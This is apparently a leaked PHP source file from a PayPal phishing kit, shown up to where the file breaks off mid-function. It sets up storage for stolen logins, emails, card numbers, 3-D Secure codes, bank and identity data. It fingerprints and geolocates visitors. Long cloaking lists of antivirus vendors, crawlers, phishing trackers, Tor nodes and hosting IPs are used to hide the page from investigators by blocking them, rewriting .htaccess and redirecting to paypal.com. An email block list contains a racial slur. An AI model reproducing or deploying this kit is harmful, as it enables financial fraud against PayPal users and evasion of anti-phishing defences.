<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
Fucked By [!]DNThirTeen
https://www.facebook.com/groups/leakcode/
*/
session_start();
set_time_limit(0);
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");

class KuzuluyArt {
  public $server_api = "https://kuzuluy.app";
  public $dir_logs = __DIR__ . "/logs";
  public $file_config = "config.json";
  public $file_result = "result.json";
  public $logs_allow = "allow.json";
  public $logs_block = "block.json";
  public function logs($name) {
    $data = array(
      'login' => 'data_login.txt',
      'email' => 'data_email.txt',
      'card' => 'data_card.txt',
      '3dsecure' => 'data_3dsecure.txt',
      'bank' => 'data_bank.txt',
      'identity' => 'data_identity.txt'
    );
    return $this->dir_logs.'/'.$data[$name];
  }
  public function config($data) {
    $config = json_decode(file_get_contents(__DIR__.'/'.$this->file_config), true);
    if ($data == "apikey") {
      return $config[$data];
    } else {
      return $config['config'][$data];
    }
  }
  public function redirect($url) {
    header("location: ".$url);
    exit;
  }
  public function session($data, $value, $page) {
    if (isset($_SESSION[$data])) {
      if ($_SESSION[$data] == $value) {
        $this->allow($page);
      } else {
        $this->block("Session incorrect");
        $this->ngeblock("official");
      }
    } else {
      $this->block("Session undefined");
      $this->ngeblock("official");
    }
  }
  public function logout() {
    @session_destroy();
    $this->delete_cookie();
  }
  public function create_cookie() {
    setcookie("access_key", $_SESSION['key'], time()+7200);
  }
  public function check_cookie() {
    if (isset($_COOKIE['access_key'])) {
      if ($_COOKIE['access_key'] != $_SESSION['key']) {
        $this->ngeblock("official");
      }
    } else {
      $this->ngeblock("official");
    }
  }
  public function delete_cookie() {
    unset($_COOKIE['access_key']);
  }
  public function quote() {
    return ucfirst($this->get($this->server_api."/check?quote")['decode']['quote']);
  }
  public function bin($bin) {
    $bin = $this->get($this->server_api."/check?bin=".$bin)['decode'];
    return array(
      'brand' => $bin['brand'],
      'type'  => $bin['type'],
      'bank'  => $bin['bank'],
      'level' => $bin['level'],
      'country' => $bin['country'],
      'full'  => $bin['brand']." ".$bin['type']." ".$bin['bank']." ".$bin['level']
    );
  }
  public function ngerandom() {
    return $this->encypt(microtime());
  }
  public function get($url) {
    $curl = curl_init();
    $option = [
      CURLOPT_SSL_VERIFYPEER  => false,
      CURLOPT_RETURNTRANSFER  => true,
      CURLOPT_URL             => $url,
      CURLOPT_USERAGENT       => 'Mozilla/5.0 (Macintosh; Intel Mac OS X vip; rv:42.0) Gecko/06072000 Firefox/42.0',
      CURLOPT_COOKIEJAR       => $this->dir_logs.'/cookie.txt',
      CURLOPT_COOKIEFILE      => $this->dir_logs.'/cookie.txt'
    ];
    curl_setopt_array($curl, $option);
    $data = curl_exec($curl);
    $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE);
    $httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);
    return array(
      'data'      => $data,
      'type'      => $type,
      'decode'    => json_decode($data, true),
      'httpcode'  => $httpcode
    );
  }
  public function getIp() {
    if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
      return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP)) {
      return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
      return $_SERVER['REMOTE_ADDR'];
    }
  }
  public function getOs() {
    $os = "Unknown OS";
    $os_array = array(
      '/windows nt 10/i'      =>  'Windows 10',
      '/windows nt 6.3/i'     =>  'Windows 8.1',
      '/windows nt 6.2/i'     =>  'Windows 8',
      '/windows nt 6.1/i'     =>  'Windows 7',
      '/windows nt 6.0/i'     =>  'Windows Vista',
      '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
      '/windows nt 5.1/i'     =>  'Windows XP',
      '/windows xp/i'         =>  'Windows XP',
      '/windows nt 5.0/i'     =>  'Windows 2000',
      '/windows me/i'         =>  'Windows ME',
      '/win98/i'              =>  'Windows 98',
      '/win95/i'              =>  'Windows 95',
      '/win16/i'              =>  'Windows 3.11',
      '/macintosh|mac os x/i' =>  'Mac OS X',
      '/mac_powerpc/i'        =>  'Mac OS 9',
      '/linux/i'              =>  'Linux',
      '/ubuntu/i'             =>  'Ubuntu',
      '/iphone/i'             =>  'iPhone',
      '/ipod/i'               =>  'iPod',
      '/ipad/i'               =>  'iPad',
      '/android/i'            =>  'Android',
      '/blackberry/i'         =>  'BlackBerry',
      '/webos/i'              =>  'Mobile'
    );
    foreach ($os_array as $regex => $value) {
      if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
        $os = $value;
      }
    }
    return $os;
  }
  public function getBrowser() {
    $browser = "Unknown Browser";
    $browser_array = array(
      '/msie/i'       =>  'Internet Explorer',
      '/firefox/i'    =>  'Firefox',
      '/safari/i'     =>  'Safari',
      '/chrome/i'     =>  'Chrome',
      '/edge/i'       =>  'Edge',
      '/opera/i'      =>  'Opera',
      '/netscape/i'   =>  'Netscape',
      '/maxthon/i'    =>  'Maxthon',
      '/konqueror/i'  =>  'Konqueror',
      '/mobile/i'     =>  'Handheld Browser'
    );
    foreach ($browser_array as $regex => $value) {
      if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
        $browser = $value;
      }
    }
    return $browser;
  }
  public function getHost() {
    return gethostbyaddr($_SESSION['ip']);
  }
  public function getLanguage() {
    return array(
      'code'  => substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2),
      'full'  => $_SERVER['HTTP_ACCEPT_LANGUAGE']
    );
  }
  public function getReferer() {
    if (isset($_SERVER['HTTP_REFERER'])) {
      return $_SERVER['HTTP_REFERER'];
    } else {
      return "no-referer";
    }
  }
  public function getUseragent() {
    return $_SERVER['HTTP_USER_AGENT'];
  }
  public function location() {
    return array(
      'title'  => implode(" - ", array($_SESSION['country'], $_SESSION['state'])),
      'full'  => implode(", ", array($_SESSION['city'], $_SESSION['district'], $_SESSION['state'], $_SESSION['country']))
    );
  }
  public function result() {
    //$query = "api?key=".$this->config("apikey")."&scam=paypal";
    //$api = $this->get($this->server_api."/".$query)['decode'];
    $api = json_decode(file_get_contents(__DIR__.'/'.$this->file_result), true);
    return array(
      'login' => $api['result_login'],
      'card' => $api['result_card'],
    );
  }
  public function data() {
    $_SESSION['ip']           = $this->getIp();
    $_SESSION['host']         = $this->getHost();
    $_SESSION['key']          = $this->ngerandom();
    $_SESSION['lang']         = $this->getLanguage()['code'];
    $_SESSION['language']     = $this->getLanguage()['full'];
    $_SESSION['os']           = $this->getOs();
    $_SESSION['browser']      = $this->getBrowser();
    $_SESSION['referer']      = $this->getReferer();
    $_SESSION['useragent']    = $this->getUseragent();
    //$query /* data ipquery */ = "check?ip=".$_SESSION['ip']."&apikey=".$this->config("apikey")."&scam=paypal";
    //$api   /* data ipapi */   = $this->get($this->server_api."/".$query)['decode'];
    $_result = $this->get('http://ip-api.com/json/'.$_SESSION['ip'].'?fields=520191&lang=en')['decode'];
    $dn13 = $this->get("http://extreme-ip-lookup.com/json/{$_SESSION['ip']}")['decode'];
    $_SESSION['isp']          = $_result['isp'];
    $_SESSION['countrycode']  = $_result['countryCode'];
    $_SESSION['country']      = $_result['country'];
    $_SESSION['statecode']    = $_result['region'];
    $_SESSION['state']        = $_result['regionName'];
    $_SESSION['district']     = '';
    $_SESSION['city']         = $dn13['city'];
    $_SESSION['geonameid']    = '';
    $_SESSION['latlongid']    = '';
    $_SESSION['latitude']     = $dn13['lat'];
    $_SESSION['longitude']    = $dn13['lon'];
    $_SESSION['iptimezone']   = $_result['timezone'];
    $_SESSION['kuzuluy_block'] = 'N';
  }
  public function save($file, $text, $type) {
    $fp = fopen($file, $type);
    return fwrite($fp, $text);
    fclose($fp);
  }
  public function error($str) {
    if ($str == 1) {
      $page = $this->get($this->server_api."/assets/html/paypal/cpanel_suspend.html")['data'];
      $html = preg_replace('{WEBMASTER}', $_SERVER['SERVER_ADMIN'], $page);
      sleep(2); die($html);
    } elseif ($str == 2) {
      $page = $this->get($this->server_api."/assets/html/paypal/cpanel_default.html")['data'];
      $html = preg_replace('{WEBMASTER}', $_SERVER['SERVER_ADMIN'], $page);
      sleep(2); die($html);
    } else {
      $page = $this->get($this->server_api."/assets/html/paypal/tcp_error.html")['data'];
      sleep(8); die($page);
    }
  }
  public function ngeblock($str) {
    $this->logout();
    if ($str == "error") {
      $this->htaccess("block");
      $error = rand(1,2);
      if ($error == 1) {
        $this->redirect("cgi-sys/suspendedpage.cgi");
      } else{
        $this->redirect("cgi-sys/defaultwebpage.cgi");
      }
    } elseif ($str == "official") {
      $this->htaccess("complete");
      $this->redirect("https://www.paypal.com/");
    }
  }
  public function allow($str) {
    $file = $this->dir_logs.'/'.$this->logs_allow;
    $json = json_decode(file_get_contents($file), true);
    $data['date'] = date('j F Y, H:i:s');
    $data['page'] = $str;
    $data['country'] = $_SESSION['country'];
    $data['ip'] = $_SESSION['ip'];
    $data['isp'] = $_SESSION['isp'];
    $data['host'] = $_SESSION['host'];
    $data['referer'] = $_SESSION['referer'];
    $data['useragent'] = $_SESSION['useragent'];
    array_push($json['allow'], $data);
    $text = json_encode($json, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    return $this->save($file, $text, "w+");
  }
  public function block($str) {
    $file = $this->dir_logs.'/'.$this->logs_block;
    $json = json_decode(file_get_contents($file), true);
    $data['date'] = date('j F Y, H:i:s');
    $data['reason'] = $str;
    $data['country'] = $_SESSION['country'];
    $data['ip'] = $_SESSION['ip'];
    $data['isp'] = $_SESSION['isp'];
    $data['host'] = $_SESSION['host'];
    $data['referer'] = $_SESSION['referer'];
    $data['useragent'] = $_SESSION['useragent'];
    array_push($json['block'], $data);
    $text = json_encode($json, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    return $this->save($file, $text, "w+");
  }
  public function htaccess($str) {
    $block = "RewriteCond %{REMOTE_ADDR} ^".$_SERVER['REMOTE_ADDR']."$\nRewriteCond %{REQUEST_URI} !^\/script\.php$ [NC]\nRewriteRule .* - [L,R=404]\n\n";
    $complete = "RewriteCond %{REMOTE_ADDR} ^".$_SERVER['REMOTE_ADDR']."$\nRewriteRule (.*) https://www.paypal.com/ [R]\n\n";
    if ($str == "block") {
      return $this->save(__DIR__ . "/.htaccess", $block, "a");
    } elseif ($str == "complete") {
      return $this->save(__DIR__ . "/.htaccess", $complete, "a");
    }
  }
  public function blocker() {
    if ($_SESSION['kuzuluy_block'] == "Y") {
      $this->block("Kuzuluy blacklist");
      $this->ngeblock("error");
    }
    if ($this->config("useragent") == "on") { $this->blocker_useragent(); }
    if ($this->config("host") == "off") { $this->blocker_host(); }
    if ($this->config("ip") == "off") { $this->blocker_ip(); }
    if ($this->config("isp") == "off") { $this->blocker_isp(); }
    if ($this->config("dinamic") == "off") { $this->blocker_dinamic(); }
    if ($this->config("proxyport") == "on") { $this->blocker_proxyport(); }
    if ($this->config("dns") == "off") { $this->blocker_dns(); }
  }
  public function blocker_email() {
    //$query = "bot?apikey=".$this->config("apikey")."&type=email&scam=paypal";
    //$api = $this->get($this->server_api."/".$query)['decode'];
    $api = array(
    "12345",
    "anti",
    "asdf",
    "bitch",
    "bot",
    "dick",
    "dump",
    "example",
    "fake",
    "flowershop",
    "fuck",
    "hacker",
    "idiot",
    "junk",
    "kill",
    "paypal",
    "plasmatv",
    "qwer",
    "safe",
    "sample",
    "scam",
    "shit",
    "skim",
    "spam",
    "smoking",
    "stupid",
    "suck",
    "temp",
    "test",
    "toilet",
    "trash",
    "warm",
    "yopmail",
    "nigger"
        );
    foreach ($api as $email) {
      if (stristr($_SESSION['email'], $email) !== false) {
        $this->block("Email blacklist (".$_SESSION['email'].")");
        return true;
      }
    }
  }
  public function blocker_useragent() {
    //$query = "bot?apikey=".$this->config("apikey")."&type=agent&scam=paypal";
    //$api = $this->get($this->server_api."/".$query)['decode'];
    $api = array(
    "007ac9",
    "control",
    "50.nu",
    "80legs",
    "192.comagent",
    "abonti",
    "aboundex",
    "accoona",
    "acunetix",
    "addthis",
    "admantx",
    "ahrefs",
    "alligator",
    "amagit",
    "analytics",
    "aolbuild",
    "apache",
    "apercite",
    "apexoo",
    "archive",
    "ask",
    "asterias",
    "attach",
    "auresys",
    "avast",
    "b2w",
    "backdoor",
    "backstreet",
    "badass",
    "baid",
    "baidu",
    "bandit",
    "bibnum",
    "bigfoot",
    "biglotron",
    "bing",
    "binlar",
    "bitdefender",
    "black.hole",
    "blackwidow",
    "blow",
    "bot",
    "brandverity",
    "brother",
    "buddy",
    "capture",
    "casper",
    "cegbfeieh",
    "cfnetwork",
    "change",
    "check",
    "china",
    "choppy",
    "cl0na",
    "cmsworld",
    "cognitiveseo",
    "collector",
    "comodo",
    "contaxe",
    "convera",
    "copier",
    "copyright",
    "crawl",
    "cyberpatrol",
    "dataprovider",
    "daumoa",
    "detection",
    "diavol",
    "disco",
    "docomo",
    "domain",
    "download",
    "dreampassport",
    "duckduckgo",
    "ebay",
    "ecatch",
    "envolk",
    "extract",
    "ezid",
    "ezooms",
    "facebook",
    "fbav",
    "feedfetcher",
    "find",
    "finder",
    "findlink",
    "firebird",
    "flicky",
    "flock",
    "fluffy",
    "ftp",
    "fuck",
    "g00g1e",
    "gcreep",
    "generator",
    "genieo",
    "get",
    "gigablast",
    "github",
    "gmail",
    "golem",
    "google",
    "grab",
    "grapeshot",
    "gromit",
    "grub.org",
    "harvest",
    "help",
    "heritrix",
    "http",
    "httrack",
    "ichiro",
    "ifopath",
    "index",
    "ingrid",
    "insights",
    "inventory",
    "ips-agent",
    "jabber",
    "java",
    "jetbrains",
    "jetty",
    "jnlp",
    "joc",
    "kaspersky",
    "kmccrew",
    "konqueror",
    "larbin",
    "lightspeed",
    "linkdex",
    "linklooker",
    "loader",
    "ltx71",
    "lynx",
    "mail",
    "majestic",
    "map",
    "mastodon",
    "mddc",
    "media",
    "memo",
    "meta",
    "microsoft",
    "miixpc",
    "miner",
    "mister",
    "mj12",
    "muckrack",
    "neofonie",
    "net4.0c",
    "net4.0e",
    "net clr",
    "netcraft",
    "netscape",
    "netsparker",
    "newrelicpinger",
    "nikto",
    "ninja",
    "nuhk",
    "nutch",
    "nuzzel",
    "offline",
    "omgili",
    "page",
    "panscient",
    "phantom",
    "phishtank",
    "php",
    "pipes",
    "planetwork",
    "pocketparser",
    "postrank",
    "preview",
    "privoxy",
    "proximic",
    "proxy",
    "pump",
    "python",
    "rambler",
    "reaper",
    "recorder",
    "redlug",
    "resolve",
    "ripper",
    "rma",
    "ruby",
    "safe",
    "scan",
    "scmguard",
    "scope",
    "scoutjet",
    "scrapy",
    "search",
    "server",
    "service",
    "siclab",
    "site",
    "skygrid",
    "slurp",
    "sogou",
    "sootle",
    "spam",
    "spanner",
    "spider",
    "spinn3r",
    "sucker",
    "summify",
    "suzuran",
    "sygol",
    "szukacz",
    "takeout",
    "telegram",
    "teleport",
    "telesoft",
    "teoma",
    "thinklab",
    "titan",
    "tlsprober",
    "tool",
    "total",
    "traackr",
    "translate",
    "trident",
    "trivial",
    "turingos",
    "turnit",
    "twiceler",
    "um-ln",
    "unchaos",
    "untrusted",
    "unwindfetchor",
    "upflow",
    "url",
    "vacuum",
    "vbseo",
    "vci",
    "virus",
    "voideye",
    "win98",
    "windows 95",
    "windows 98",
    "worm",
    "www",
    "xaldon",
    "xenu",
    "xxxyy",
    "yahoo",
    "yandex",
    "yanga",
    "yes",
    "yeti",
    "youda",
    "youtube",
    "zade",
    "zeus",
    "zibb",
    "zipcommander",
    "zmeu",
    "zune",
    "zyborg"
        );
    foreach ($api as $useragent) {
      if (empty($_SESSION['useragent']) || substr_count(strtolower($_SESSION['useragent']), $useragent) > 0) {
        $this->block("Useragent blacklist");
        $this->ngeblock("error");
      }
    }
  }
  public function blocker_ip() {
    $query1 = "bot?apikey=".$this->config("apikey")."&type=ip&scam=paypal";
    $query2 = "bot?apikey=".$this->config("apikey")."&type=latlong&scam=paypal";
    $api = array(
      'ip' => array(
    "^12.148.196.*",
    "^12.148.209.*",
    "^23.27.*.*",
    "^38.100.*.*",
    "^38.105.*.*",
    "^38.122.*.*",
    "^38.130.*.*",
    "^38.144.36.*",
    "^40.107.240.*",
    "^40.107.246.*",
    "^40.107.*.*",
    "^46.116.*.*",
    "^50.7.*.*",
    "^50.97.*.*",
    "^52.192.164.*",
    "^54.176.*.*",
    "^62.90.*.*",
    "^62.116.207.*",
    "^64.18.*.*",
    "^64.27.2.*",
    "^64.37.103.*",
    "^64.62.136.*",
    "^64.62.175.*",
    "^64.71.*.*",
    "^64.74.215.*",
    "^64.106.213.*",
    "^64.124.14.*",
    "^64.233.160.*",
    "^66.102.6.*",
    "^66.102.*.*",
    "^66.135.200.*",
    "^66.150.14.*",
    "^66.205.64.*",
    "^66.207.120.*",
    "^66.221.*.*",
    "^66.249.*.*",
    "^67.15.*.*",
    "^67.209.128.*",
    "^67.221.235.*",
    "^69.61.12.*",
    "^69.65.*.*",
    "^70.42.*.*",
    "^72.14.192.*",
    "^72.189.150.*",
    "^73.71.155.*",
    "^74.3.160.*",
    "^74.125.*.*",
    "^74.217.*.*",
    "^81.0.48.*",
    "^81.161.59.*",
    "^82.102.27.*",
    "^82.166.*.*",
    "^85.64.*.*",
    "^85.250.*.*",
    "^89.138.*.*",
    "^89.234.68.*",
    "^91.103.66.*",
    "^92.23.57.*",
    "^93.159.230.*",
    "^93.172.*.*",
    "^95.42.48.*",
    "^96.31.1.*",
    "^107.170.*.*",
    "^109.173.137.*",
    "^109.186.*.*",
    "^128.242.*.*",
    "^131.212.*.*",
    "^149.3.91.*",
    "^149.20.*.*",
    "^158.108.*.*",
    "^167.24.*.*",
    "^168.188.*.*",
    "^171.13.*.*",
    "^173.194.*.*",
    "^173.224.*.*",
    "^173.239.219.*",
    "^173.255.233.*",
    "^184.173.*.*",
    "^185.20.4.*",
    "^185.20.5.*",
    "^188.42.195.*",
    "^192.115.134.*",
    "^192.118.48.*",
    "^193.47.80.*",
    "^193.220.178.*",
    "^193.253.199.*",
    "^194.52.68.*",
    "^194.72.238.*",
    "^194.90.*.*",
    "^196.54.55.*",
    "^198.25.*.*",
    "^198.54.*.*",
    "^199.30.228.*",
    "^202.108.252.*",
    "^204.14.48.*",
    "^206.28.72.*",
    "^206.40.*.*",
    "^206.80.*.*",
    "^206.207.*.*",
    "^207.70.*.*",
    "^207.126.144.*",
    "^208.65.144.*",
    "^208.91.115.*",
    "^209.19.*.*",
    "^209.73.228.*",
    "^209.85.128.*",
    "^209.85.*.*",
    "^212.29.192.*",
    "^212.29.224.*",
    "^212.50.193.*",
    "^212.101.*.*",
    "^212.143.*.*",
    "^212.150.*.*",
    "^212.235.*.*",
    "^216.239.32.*",
    "^216.252.167.*",
    "^217.132.*.*"
          ),
      'latlong' => array()
    );
    if (in_array($_SESSION['ip'], $api['ip'])) {
      $this->block("Ip1 blacklist");
      $this->ngeblock("error");
    } else {
      foreach ($api['ip'] as $ip) {
        if (preg_match("/$ip/", $_SESSION['ip'])) {
          $this->block("Ip2 blacklist");
          $this->ngeblock("error");
        }
      }
    }
    foreach ($api['latlong'] as $latlong) {
      if (substr_count($_SESSION['latlongid'], $latlong) > 0) {
        $this->block("Ip3 blacklist");
        $this->ngeblock("error");
      }
    }
  }
  public function blocker_isp() {
    //$query = "bot?apikey=".$this->config("apikey")."&type=isp&scam=paypal";
    //$api = $this->get($this->server_api."/".$query)['decode'];
    $api = array(
    "01cloud",
    "013 netvision",
    "1&1 internet ag",
    "abercrombie & fitch",
    "algar telecom s\/a",
    "amazon",
    "amazon.com",
    "apexis ag",
    "atlantic.net",
    "avast software s.r.o.",
    "avenir telematique s.a.s",
    "b2 net solutions",
    "barracuda networks",
    "bayer business services gmbh",
    "beeline home",
    "bezeq international",
    "bitdefender",
    "bitdefender srl",
    "brass horn communications",
    "british telecommunications plc",
    "bullguard aps",
    "cachednet llc",
    "centrilogic",
    "chenhua tech",
    "china mobile guangdong",
    "china telecom",
    "china telecom jiangsu",
    "choopa, llc",
    "cisco systems",
    "cisco systems inc.",
    "citynet telekom ltd.",
    "claro s.a.",
    "coloup",
    "colt technology services group limited",
    "completel",
    "contabo gmbh",
    "cortland electronics corp",
    "datacamp s.r.o",
    "datacity",
    "datashack, lc",
    "defense.net",
    "deutsche telekom ag",
    "digital freedom and rights association",
    "digital ocean",
    "digitalocean",
    "dodo australia",
    "domaintools, llc",
    "e.i. du pont de nemours and co.",
    "egihosting",
    "eircom",
    "emerald onion",
    "entanet",
    "eurafibre sas",
    "facebook",
    "faction",
    "forcepoint, llc",
    "frantech solutions",
    "free sas",
    "fujitsu limited",
    "gci communications",
    "google",
    "google fiber",
    "hetzner",
    "host1plus",
    "hotwire fision",
    "hurricane electric",
    "incrediserve ltd",
    "internap network services corporation",
    "internet solutions",
    "jigsaw data corporation",
    "kaspersky",
    "kaspersky lab ao",
    "keliweb s.r.l.",
    "korea telecom",
    "level 3 communications",
    "linode",
    "llc globalnet",
    "logicweb inc",
    "m247 europe srl",
    "m247 ltd",
    "makonix sia",
    "marriott international",
    "mcafee",
    "merck and co.",
    "microsoft bingbot",
    "microsoft corporation",
    "net virtua",
    "netart group s.r.o.",
    "netmagic datacenter",
    "netstack cloud services",
    "network layer technologies inc",
    "new dream network, llc",
    "nforce entertainment b.v.",
    "ntt",
    "ntt pc communications",
    "oppobox llc",
    "orange",
    "orange polska",
    "overkill alpha s.r.o.",
    "ovh",
    "ovh hosting",
    "ovh sas",
    "paypal",
    "peak 10",
    "philippine long distance telephone",
    "plusnet",
    "plusnet technologies ltd",
    "private layer inc",
    "privax ltd",
    "privax ltd.",
    "proofpoint, inc.",
    "ptgi international carrier services ltd",
    "purevpn",
    "resilans ab",
    "rostelecom",
    "santa cruz community internet",
    "secure computing corp. . fka",
    "secure internet limited",
    "secure internet llc",
    "serbia broadband-srpske kablovske mreze d.o.o.",
    "server central network",
    "servermania",
    "servetheworld as",
    "sk broadband",
    "sologigabit",
    "solution pro",
    "sungard availability network solutions",
    "sungard network solutions",
    "sunrise communications ag",
    "surfcontrol",
    "symantec corporation",
    "t.m.a serv srl",
    "talktalk",
    "tata teleservices isp",
    "teledata gmbh",
    "teleservice nederland telematica installateurs",
    "ties",
    "top level hosting srl",
    "tpg internet",
    "transip b.v.",
    "trend micro incorporated",
    "tvoi net ltd.",
    "twitter",
    "uarnet",
    "uk government department for work and pensions",
    "upc austria",
    "venus business communications limited",
    "verizon uk limited",
    "virtual1 limited",
    "vodafone gmbh",
    "vodafone italia",
    "voxility llp",
    "vultr",
    "web hosting solutions",
    "westnet",
    "world hosting farm limited",
    "yandex llc",
    "youtube, llc",
    "zayo bandwidth",
    "zwiebelfreunde e.v."
        );
    foreach ($api as $isp) {
      if (empty($_SESSION['isp']) || substr_count(strtolower($_SESSION['isp']), $isp) > 0) {
        $this->block("Isp blacklist");
        $this->ngeblock("error");
      }
    }
  }
  public function blocker_dns() {
    $data = array('exitnodes.tor.dnsbl.sectoor.de', 'tor.dnsbl.sectoor.de', 'tor.dan.me.uk', 'bl.spamcop.net');
    foreach ($data as $dns) {
      if (checkdnsrr(implode(".", array_reverse(explode(".", $_SESSION['ip']))).".".$dns.".", "A")) {
        $this->block("Dns blacklist (".$dns.")");
        $this->ngeblock("error");
      }
    }
  }
  public function blocker_host() {
    //$query = "bot?apikey=".$this->config("apikey")."&type=host&scam=paypal";
    //$api = $this->get($this->server_api."/".$query)['decode'];
    $api = array(
    "100tb",
    "163data",
    "abelons",
    "above",
    "acsalaska",
    "acunetix",
    "afterplayy",
    "all.de",
    "amazonaws",
    "amuri",
    "antivirus",
    "apx.pub",
    "aquaray",
    "artikel10",
    "aruba",
    "avast",
    "avirasof",
    "babylon.network",
    "badware",
    "baidu",
    "barracuda",
    "bezeqint",
    "Bitdefender",
    "blockone",
    "bruuk",
    "btcentralplus",
    "caiway",
    "calyxinstitute",
    "ccanet.co.uk",
    "cdn77",
    "centralnic",
    "cisco",
    "citynethost",
    "cloudflare",
    "coffswifi",
    "colocrossing",
    "coloup",
    "comodo",
    "completel",
    "crawl",
    "cs.vt.edu",
    "cymru",
    "cyveillance",
    "dancehelp",
    "danpro",
    "datapacket.com",
    "datasift",
    "development",
    "digitalcourage",
    "digitale-gesellschaft",
    "digiweb",
    "dreamhost",
    "drweb",
    "ebay",
    "enn.lu",
    "enom",
    "enta.net",
    "eset",
    "eurohoster",
    "euskaltel",
    "factioninc",
    "fireeye",
    "fkraus",
    "geosr",
    "ghst.net",
    "google",
    "gp4telecom",
    "greyponyit",
    "hackercombat",
    "hinet",
    "hkdata",
    "hosting",
    "iam.net.ma",
    "ibercom",
    "impium",
    "infoweb.ne.jp",
    "initiative-s.de",
    "intelnet.net.gt",
    "ip-backbone",
    "ipredator",
    "ish.net.br",
    "kaspersky",
    "kasserver",
    "les.net",
    "Level3",
    "li420-167",
    "linode",
    "lipperhey",
    "mailscanner",
    "mailshell",
    "malcare",
    "malwaretips",
    "mcAfee",
    "messagelabs",
    "metadefender",
    "metascan",
    "metauri",
    "mit.edu",
    "moscow.rt.ru",
    "msnbot",
    "netcraft",
    "netpilot",
    "nod32",
    "nortor",
    "nos-oignons",
    "opendns",
    "oracle",
    "orange-labs.fr",
    "ovh",
    "p3pwgdsn",
    "pacbell",
    "pagepeeker",
    "paradisenetworks",
    "paypal",
    "phishing",
    "phishlabs",
    "phishmongers",
    "phishtank",
    "phpnet",
    "planet.nl",
    "plus.net",
    "point",
    "poneytelecom",
    "potia",
    "powertech",
    "prcdn",
    "proxy-node",
    "prtelecom",
    "psychz",
    "quadranet",
    "qualys",
    "quintex",
    "quttera",
    "redbackinternet",
    "rescan",
    "researchscan",
    "reverse",
    "rima-td",
    "roamsite",
    "safebrowsing",
    "sannet",
    "scaleway",
    "scnet",
    "shadowserver",
    "signal.center",
    "SiteAdvisor",
    "sitecheck2",
    "siteguarding",
    "softlayer",
    "solnet.ch",
    "solutions",
    "speedtravel",
    "spro",
    "startdedicated",
    "stretchoid",
    "stwserver",
    "sucuri",
    "surriel",
    "symantec",
    "sysms",
    "systems",
    "telecomitalia",
    "teledata-fttx",
    "telekom.rs",
    "telesp.net.br",
    "tfbnw",
    "tor-exit",
    "tor.exit",
    "torservers",
    "tpnet",
    "trendmicro",
    "trendnet",
    "trustwave",
    "ttksever.ru",
    "TweetmemeBot",
    "twttr",
    "ukservers",
    "upcbusiness",
    "usabroadband",
    "uscc",
    "veripayed",
    "versanet",
    "virustotal",
    "vodafone",
    "vsnl.net.in",
    "wach-it-solutions",
    "webinspector",
    "wind.it",
    "xmission",
    "yahoo",
    "your-server.de",
    "z-telekom",
    "zare",
    "zoot",
    "ztomy",
    "telenor"
        );
    foreach ($api as $host) {
      if (empty($_SESSION['host']) || substr_count(strtolower($_SESSION['host']), $host) > 0) {
        $this->block("Hostname blacklist");
        $this->ngeblock("error");
      }
    }
  }
  public function blocker_dinamic() {
    $data = $this->get("http://bot.myip.ms/".$_SESSION['ip'])['data'];
    if (preg_match("/Bot exists/", $data)) {
      $this->block("Dinamic blacklist");
      $this->ngeblock("error");
    }
  }
  public function blocker_proxyport() {
    $dataproxy = array(
      'CLIENT_IP',
      'FORWARDED',
      'FORWARDED_FOR',
      'FORWARDED_FOR_IP',
      'VIA',
      'X_FORWARDED',
      'X_FORWARDED_FOR',
      'HTTP_CLIENT_IP',
      'HTTP_FORWARDED',
      'HTTP_FORWARDED_FOR',
      'HTTP_FORWARDED_FOR_IP',
      'HTTP_PROXY_CONNECTION',
      'HTTP_VIA',
      'HTTP_X_FORWARDED',
      'HTTP_X_FORWARDED_FOR'
    );
    foreach ($dataproxy as $proxy) {
      if (isset($_SERVER[$proxy])) {
        $this->block("Proxy detected");
        $this->ngeblock("error");
      }
    }
    $dataport = array(80, 81, 553, 554, 1080, 3128, 4480, 6588, 8000, 8080);
    foreach ($dataport as $port) {
      if (@fsockopen($_SERVER['REMOTE_ADDR'], $port, $errno, $errstr, 3)) {
        $this->block("Port detected");
        $this->ngeblock("error");
      }
    }
  }
  public function encypt($str) {
    return md5($str);
  }
  public function image_encode($str) {
    require __DIR__ . '/system/class/mime.php';
    $url = base64_encode($this->get($str)['data']);
    $local = base64_encode(file_get_contents(__DIR__. '/'.$str));
    return array(
      'url'   => "data:".$this->get($str)['type'].";base64,".$url,
      'local' => "data:".mime_content_type($str).";base64,".$local
    );
  }
  public function text_encode($str) {
